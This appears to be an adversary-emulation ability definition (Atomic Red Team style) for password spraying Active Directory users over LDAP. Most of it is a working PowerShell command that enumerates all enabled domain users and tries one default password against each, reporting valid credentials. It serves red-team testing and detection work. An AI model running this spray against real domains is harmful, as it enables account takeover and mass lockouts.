- id: f14d956a-5b6e-4a93-847f-0c415142f07d
  name: Password spray all Active Directory domain users with a single password via
    LDAP against domain controller (NTLM or Kerberos)
  description: 'Attempt to brute force all Active Directory domain users with a single
    password (called "password spraying") on a domain controller, via LDAP, with NTLM
    or Kerberos


    Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain
    user (to fetch the list of all domain users)'
  tactic: credential-access
  technique:
    attack_id: T1110.003
    name: 'Brute Force: Password Spraying'
  platforms:
    windows:
      psh:
        command: 'if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {; Write-Host
          "Only ''NTLM'' and ''Kerberos'' auth methods are supported"; exit 1; };
          $DomainUsers = Get-ADUser -LDAPFilter ''(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))''
          -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName;
          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
          | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389);
          $DomainUsers | Foreach-Object {; $user = $_; $password = ''P@ssw0rd!'';
          $credz = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain");
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di,
          $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM); try {; Write-Host
          " [-] Attempting ${password} on account ${user}."; $conn.bind(); # if credentials
          aren''t correct, it will break just above and goes into catch block, so
          if we''re here we can display success; Write-Host " [!] ${user}:${password}
          are valid credentials!"; } catch {; Write-Host $_.Exception.Message; };
          }; Write-Host "End of password spraying"'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1110.003
  - atomic-red-team
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      password:
        description: single password we will attempt to auth with (if you need several
          passwords, then it is a bruteforce so see T1110.001)
        type: string
        default: P@ssw0rd!
      domain:
        description: Domain FQDN
        type: string
        default: $env:UserDnsDomain
      auth:
        description: authentication method to choose between "NTLM" and "Kerberos"
        type: string
        default: NTLM
    technique_created: '2020-02-11T18:39:25.122Z'
    atomic_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
    import_timestamp: '2025-08-22T03:08:48.495181Z'
